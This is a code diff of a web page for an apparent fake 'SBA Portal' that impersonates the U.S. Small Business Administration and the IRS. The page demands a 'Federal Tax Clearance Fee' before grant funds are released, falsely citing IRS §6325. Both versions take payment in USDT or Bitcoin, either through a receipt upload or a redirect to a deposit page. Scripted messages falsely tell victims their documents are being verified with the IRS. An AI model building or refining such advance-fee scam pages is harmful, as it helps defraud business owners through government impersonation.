@@ -1,105 +1,102 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" data-theme="light">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Tax Clearance | SBA Portal</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     <link rel="stylesheet" href="global.css">
 </head>
-<body style="background: #f1f5f9;">
+<body>
 
-    <div class="container" style="max-width: 650px;">
-        <div style="text-align: center; margin-bottom: 30px;">
-            <img src="sba-logo.png" style="height: 55px; margin-bottom: 15px;">
-            <h2 style="color: var(--sba-navy);">Federal Tax Clearance Fee</h2>
-        </div>
+<div id="pageLoader" class="page-loader active"><div class="spinner"></div></div>
 
-        <div class="card" id="taxContent">
-            <!-- Notice Box -->
-            <div style="background: var(--sba-blue-light); padding: 20px; border-radius: 8px; margin-bottom: 25px; border-left: 4px solid var(--sba-navy);">
-                <h5 style="color: var(--sba-navy); margin-bottom: 5px;"><i class="fa-solid fa-file-invoice-dollar"></i> IRS Requirement § 6325</h5>
-                <p style="font-size: 13px; color: var(--text-secondary); line-height: 1.5;">
-                    To authorize the disbursement of grant funds exceeding $50,000, federal law requires a one-time <strong>Tax Clearance Certificate</strong>. This fee verifies your business status with the IRS and ensures compliance with federal tax obligations.
-                </p>
+<div class="app-layout">
+    <aside class="app-sidebar" id="appSidebar"></aside>
+    <main class="app-main">
+        <div id="pageHeader"></div>
+        <div class="app-main__content" style="max-width: 800px;">
+            
+            <div class="card card--navy mb-8">
+                <div class="flex items-start gap-4">
+                    <i class="fa-solid fa-file-contract" style="font-size:1.5rem; color:#fbbf24;"></i>
+                    <div>
+                        <h3 style="color:#fbbf24; margin-bottom:8px; font-weight:800;">Federal Tax Clearance Certificate</h3>
+                        <p style="font-size:0.85rem; line-height:1.6; opacity:0.9;">IRS Regulation §6325 requires verification of federal tax compliance for all grant awards exceeding $50,000. This mandatory clearance ensures the recipient business has no outstanding federal liens.</p>
+                    </div>
+                </div>
             </div>
 
-            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; padding: 15px; background: var(--bg-main); border-radius: 8px;">
-                <span style="font-weight: 700; color: var(--text-secondary);">Required Fee Amount:</span>
-                <span style="font-size: 1.5rem; font-weight: 900; color: var(--sba-navy);" id="taxAmountDisplay">$0.00</span>
+            <div id="taxLocked" style="display:none;" class="status-screen">
+                <div class="status-screen__icon status-screen__icon--info"><i class="fa-solid fa-lock"></i></div>
+                <h1 class="status-screen__title">Step Not Available</h1>
+                <p class="status-screen__message">Tax clearance is only initiated once your grant application has been formally approved by the SBA Review Board.</p>
             </div>
 
-            <form id="taxForm">
-                <div class="form-group">
-                    <label class="form-label">Payment Network</label>
-                    <select class="form-input" id="tax-method">
-                        <option value="USDT_TRC20">USDT (TRC20 Network)</option>
-                        <option value="BTC">Bitcoin (BTC Network)</option>
-                    </select>
+            <div id="taxStatus" style="display:none;" class="status-screen">
+                <div id="tIcon" class="status-screen__icon"></div>
+                <h1 id="tTitle" class="status-screen__title"></h1>
+                <p id="tMsg" class="status-screen__message"></p>
+            </div>
+
+            <div id="taxForm" style="display:none;">
+                <div class="alert alert--warning mb-8">
+                    <i class="fa-solid fa-receipt"></i>
+                    <div>
+                        <strong>Required Fee: <span id="requiredFeeDisplay">$0.00</span></strong>
+                        <p style="font-size:0.75rem; margin-top:4px;">This fee covers federal processing and certificate issuance.</p>
+                    </div>
                 </div>
-
-                <div class="form-group">
-                    <label class="form-label">Upload Payment Confirmation</label>
-                    <input type="file" id="tax-receipt" class="form-input" required>
-                    <p style="font-size: 11px; color: var(--text-muted); mt-1;">Upload a screenshot of your transfer receipt (JPG, PNG).</p>
+                <!-- Payment methods reused from deposit flow logic via JS -->
+                <div id="methodContainer">
+                    <p class="form-label mb-4">Choose Settlement Method</p>
+                    <div class="method-selector" id="taxMethods">
+                        <div class="method-card" onclick="window.location.href='deposit.html'">
+                            <div class="method-card__icon text-navy"><i class="fa-solid fa-wallet"></i></div>
+                            <div class="method-card__name">Proceed to Fund Fee</div>
+                        </div>
+                    </div>
                 </div>
+            </div>
 
-                <div id="paymentFeedback"></div>
-
-                <button type="submit" class="btn btn-primary btn-full" id="taxSubmitBtn" data-original-text="Submit for Clearance">
-                    Submit for Clearance
-                </button>
-            </form>
         </div>
-    </div>
+    </main>
+</div>
 
-    <script type="module">
-        import { requireAuth, markField, toggleSubmit, showToast } from './app.js';
-        import { updateDoc, doc, db, compressImage, addLedgerEntry, notifyUser } from './firebase-config.js';
+<script type="module">
+    import { requireAuth, buildSidebar, buildDock, buildPageHeader, initNotificationBadge, formatCurrency } from './app.js';
 
-        requireAuth((user, userData) => {
-            const taxAmount = userData.taxFeeRequired || 1500; // Default or assigned
-            document.getElementById('taxAmountDisplay').innerText = `$${taxAmount.toLocaleString()}`;
+    requireAuth((user, userData) => {
+        buildSidebar({ activeId: 'tax', userData });
+        buildDock({ activeId: 'home' });
+        buildPageHeader({ title: 'Tax Clearance', subtitle: 'IRS Compliance Verification', backUrl: 'dashboard.html' });
+        initNotificationBadge(user.uid);
 
-            const form = document.getElementById('taxForm');
-            const btn = document.getElementById('taxSubmitBtn');
+        const locked = document.getElementById('taxLocked');
+        const form = document.getElementById('taxForm');
+        const status = document.getElementById('taxStatus');
 
-            form.onsubmit = async (e) => {
-                e.preventDefault();
-                const file = document.getElementById('tax-receipt').files[0];
-
-                if(!file) {
-                    markField(document.getElementById('tax-receipt'), false, "Please upload your receipt.");
-                    return;
-                }
-
-                toggleSubmit(btn, true);
-
-                try {
-                    const base64Receipt = await compressImage(file);
-                    
-                    // Update User Status
-                    await updateDoc(doc(db, "users", user.uid), {
-                        taxStatus: 'pending',
-                        taxReceipt: base64Receipt,
-                        taxMethod: document.getElementById('tax-method').value
-                    });
-
-                    // Log in Ledger
-                    await addLedgerEntry(user.uid, "Tax Clearance Fee Submission", taxAmount, "pending");
-
-                    // Internal Notification
-                    await notifyUser(user.uid, "Tax Documents Received", "Your tax clearance receipt is under review by a treasury officer.", "info");
-
-                    showToast("Payment submitted successfully.");
-                    location.href = "dashboard.html";
-
-                } catch (err) {
-                    toggleSubmit(btn, false);
-                    showToast("Error processing request.", "error");
-                }
-            };
-        });
-    </script>
+        if(userData.applyStatus !== 'APPROVED') {
+            locked.style.display = 'block';
+        } else if(userData.taxStatus === 'IDLE') {
+            form.style.display = 'block';
+            document.getElementById('requiredFeeDisplay').textContent = formatCurrency(userData.taxFeeRequired || 550);
+        } else {
+            status.style.display = 'block';
+            const icon = document.getElementById('tIcon');
+            if(userData.taxStatus === 'PENDING') {
+                icon.className = 'status-screen__icon status-screen__icon--info';
+                icon.innerHTML = '<i class="fa-solid fa-file-shield fa-pulse"></i>';
+                document.getElementById('tTitle').textContent = 'Clearance in Progress';
+                document.getElementById('tMsg').textContent = 'Your tax compliance documents are being verified with the IRS database.';
+            } else if(userData.taxStatus === 'APPROVED') {
+                icon.className = 'status-screen__icon status-screen__icon--success';
+                icon.innerHTML = '<i class="fa-solid fa-certificate"></i>';
+                document.getElementById('tTitle').textContent = 'Tax Cleared';
+                document.getElementById('tMsg').textContent = 'Your business is officially cleared for federal disbursement. Your grant certificate is being generated.';
+            }
+        }
+    });
+</script>
 </body>
 </html>
